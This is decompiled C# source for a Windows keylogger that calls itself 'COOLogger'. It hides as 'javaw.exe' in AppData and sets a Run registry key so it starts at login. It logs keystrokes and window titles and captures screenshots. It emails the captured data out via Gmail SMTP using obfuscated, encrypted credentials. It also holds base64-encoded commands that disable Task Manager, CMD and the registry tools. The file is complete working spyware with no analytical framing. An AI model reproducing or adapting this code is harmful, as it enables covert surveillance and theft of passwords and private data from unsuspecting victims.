using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class aSqGyiQTnQUisOb
{
	private static string OBcxwZHYKOnOZTl = "SnNlUzNncmlUWHRxWnlOSjNicGtQS2kyVG1lbHhXeHk=";

	private static string iGbzrozRfBoxWQt = "PXdwRmF6TGQxdjM5PTBDT0YrTEVydEZE";

	private static string vcwCKzfoonrPWdI = "smtp.gmail.com";

	private static int UUjnqiHWPygjEgk = 587;

	private static string SqGyiQTnQUisObO;

	private static string BcxwZHYKOnOZTli;

	private static string GbzrozRfBoxWQtv;

	private static string cwCKzfoonrPWdIU;

	private static string UjnqiHWPygjEgky;

	private static string tjPXYWbNGNrEETX;

	private static int epjClIrDIFQhvEF = 1500000;

	private static string LhuJpItxXMJDVSo = null;

	private static string TXaSqGyiQTnQUis = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string ObOBcxwZHYKOnOZ = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string TliGbzrozRfBoxW = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object yverRRsBNpJoMeE = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string OmhKMsySaQvqrpu = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage fmtKlkBqskKmRPx = new MailMessage();

	private static SmtpClient DiSOCXNEScLLxkL = new SmtpClient();

	[AccessedThroughProperty("iSOCXNEScLLxkLh")]
	private static huJpItxXMJDVSoL _iSOCXNEScLLxkLh;

	private static object lwzPklvFzdtMgzt = Path.GetFileName(Conversions.ToString(OTELSiJJZPRJiLp));

	private static RichTextBox aDiSOCXNEScLLxk = new RichTextBox();

	private static object OTELSiJJZPRJiLp = Application.get_ExecutablePath();

	private static readonly byte[] key = new byte[24]
	{
		1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
		11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
		21, 22, 23, 24
	};

	private static readonly byte[] iv = new byte[8] { 8, 7, 6, 5, 4, 3, 2, 1 };

	private static QtvcwCKzfoonrPW dIUUjnqiHWPygjE = new QtvcwCKzfoonrPW(key, iv);

	private static huJpItxXMJDVSoL iSOCXNEScLLxkLh
	{
		get
		{
			return _iSOCXNEScLLxkLh;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_iSOCXNEScLLxkLh != null)
			{
				huJpItxXMJDVSoL.KeyDown -= XaSqGyiQTnQUisO;
			}
			_iSOCXNEScLLxkLh = value;
			if (_iSOCXNEScLLxkLh != null)
			{
				huJpItxXMJDVSoL.KeyDown += XaSqGyiQTnQUisO;
			}
		}
	} = new huJpItxXMJDVSoL();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c2: Expected O, but got Unknown
		//IL_02e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02eb: Expected O, but got Unknown
		iSOCXNEScLLxkLh.jplwzPklvFzdtMg();
		tjPXYWbNGNrEETX = Conversions.ToString(true);
		GbzrozRfBoxWQtv = Conversions.ToString(false);
		cwCKzfoonrPWdIU = Conversions.ToString(false);
		UjnqiHWPygjEgky = Conversions.ToString(false);
		BcxwZHYKOnOZTli = Conversions.ToString(false);
		SqGyiQTnQUisObO = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, yverRRsBNpJoMeE, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(yverRRsBNpJoMeE, (object)"\\mtKlkBqskKmRPxl.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(OmhKMsySaQvqrpu + "\\mtKlkBqskKmRPxl.txt");
			streamWriter.Write(RuntimeHelpers.GetObjectValue(OTELSiJJZPRJiLp));
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(yverRRsBNpJoMeE, (object)"\\javaw.exe"))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(yverRRsBNpJoMeE, (object)"\\javaw.exe")));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Conversions.ToString(OTELSiJJZPRJiLp), Conversions.ToString(Operators.AddObject(yverRRsBNpJoMeE, (object)"\\javaw.exe")));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Conversions.ToString(OTELSiJJZPRJiLp), Conversions.ToString(Operators.AddObject(yverRRsBNpJoMeE, (object)"\\javaw.exe")));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(yverRRsBNpJoMeE, (object)"\\javaw.exe") }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(SqGyiQTnQUisObO))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(lwzPklvFzdtMgzt)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(lwzPklvFzdtMgzt), Operators.ConcatenateObject(Operators.ConcatenateObject(yverRRsBNpJoMeE, (object)"\\"), lwzPklvFzdtMgzt));
			}
		}
		if (Conversions.ToBoolean(BcxwZHYKOnOZTli))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(yverRRsBNpJoMeE, (object)"\\mtKlkBqskKmRPxl.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(GbzrozRfBoxWQtv))
		{
			Interaction.Shell(bOBcxwZHYKOnOZT(TXaSqGyiQTnQUis), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(cwCKzfoonrPWdIU))
		{
			Interaction.Shell(bOBcxwZHYKOnOZT(ObOBcxwZHYKOnOZ), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(UjnqiHWPygjEgky))
		{
			Interaction.Shell(bOBcxwZHYKOnOZT(TliGbzrozRfBoxW), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(1500000);
		val.add_Tick((EventHandler)uJpItxXMJDVSoLj_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)plwzPklvFzdtMgz_Ticked);
		val2.Start();
		Application.Run();
	}

	private static string yUVfDjNcJQiqgMH()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string bOBcxwZHYKOnOZT(string IUUjnqiHWPygjEg)
	{
		byte[] bytes = Convert.FromBase64String(IUUjnqiHWPygjEg);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void uJpItxXMJDVSoLj_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(tjPXYWbNGNrEETX))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = gztjPXYWbNGNrEE(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(yverRRsBNpJoMeE, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(yverRRsBNpJoMeE, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(dIUUjnqiHWPygjE.gkyverRRsBNpJoM(DcDOIaKgQbgdoGU(bOBcxwZHYKOnOZT(OBcxwZHYKOnOZTl))));
				mailMessage.To.Add(dIUUjnqiHWPygjE.gkyverRRsBNpJoM(DcDOIaKgQbgdoGU(bOBcxwZHYKOnOZT(OBcxwZHYKOnOZTl))));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = aDiSOCXNEScLLxk.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(dIUUjnqiHWPygjE.gkyverRRsBNpJoM(DcDOIaKgQbgdoGU(bOBcxwZHYKOnOZT(OBcxwZHYKOnOZTl))), dIUUjnqiHWPygjE.gkyverRRsBNpJoM(DcDOIaKgQbgdoGU(bOBcxwZHYKOnOZT(iGbzrozRfBoxWQt))));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				aDiSOCXNEScLLxk.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage mailMessage2 = fmtKlkBqskKmRPx;
		mailMessage2.From = new MailAddress(dIUUjnqiHWPygjE.gkyverRRsBNpJoM(DcDOIaKgQbgdoGU(bOBcxwZHYKOnOZT(OBcxwZHYKOnOZTl))));
		mailMessage2.To.Add(dIUUjnqiHWPygjE.gkyverRRsBNpJoM(DcDOIaKgQbgdoGU(bOBcxwZHYKOnOZT(OBcxwZHYKOnOZTl))));
		mailMessage2.Subject = "COOLogger Logs from - " + Environment.UserName;
		mailMessage2.Body = aDiSOCXNEScLLxk.get_Text();
		mailMessage2 = null;
		SmtpClient diSOCXNEScLLxkL = DiSOCXNEScLLxkL;
		diSOCXNEScLLxkL.Host = "smtp.gmail.com";
		diSOCXNEScLLxkL.Port = 587;
		diSOCXNEScLLxkL.EnableSsl = true;
		diSOCXNEScLLxkL.Credentials = new NetworkCredential(dIUUjnqiHWPygjE.gkyverRRsBNpJoM(DcDOIaKgQbgdoGU(bOBcxwZHYKOnOZT(OBcxwZHYKOnOZTl))), dIUUjnqiHWPygjE.gkyverRRsBNpJoM(DcDOIaKgQbgdoGU(bOBcxwZHYKOnOZT(iGbzrozRfBoxWQt))));
		diSOCXNEScLLxkL.Send(fmtKlkBqskKmRPx);
		diSOCXNEScLLxkL = null;
		aDiSOCXNEScLLxk.set_Text("");
	}

	public static void XaSqGyiQTnQUisO(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = aDiSOCXNEScLLxk;
		val.set_Text(val.get_Text() + iSOCXNEScLLxkLh.ztjPXYWbNGNrEET(e));
	}

	public static void plwzPklvFzdtMgz_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(LhuJpItxXMJDVSo, yUVfDjNcJQiqgMH(), false) != 0)
		{
			LhuJpItxXMJDVSo = yUVfDjNcJQiqgMH();
			if (Operators.CompareString(LhuJpItxXMJDVSo, "", false) != 0)
			{
				RichTextBox val = aDiSOCXNEScLLxk;
				val.set_Text(val.get_Text() + "\r\n\r\n~~~~~" + LhuJpItxXMJDVSo + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string gztjPXYWbNGNrEE(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}

	public static string DcDOIaKgQbgdoGU(string sInput)
	{
		string text = "";
		int length = sInput.Length;
		int num = length % 2;
		int num2 = length / 2;
		checked
		{
			for (int i = num2 + num; i >= 1; i += -1)
			{
				if (num == 0)
				{
					text += Strings.Mid(sInput, i + num2, 1);
				}
				text += Strings.Mid(sInput, i, 1);
				if (unchecked(num == 1 && i != 1))
				{
					text += Strings.Mid(sInput, i + num2, 1);
				}
			}
			return text;
		}
	}
}
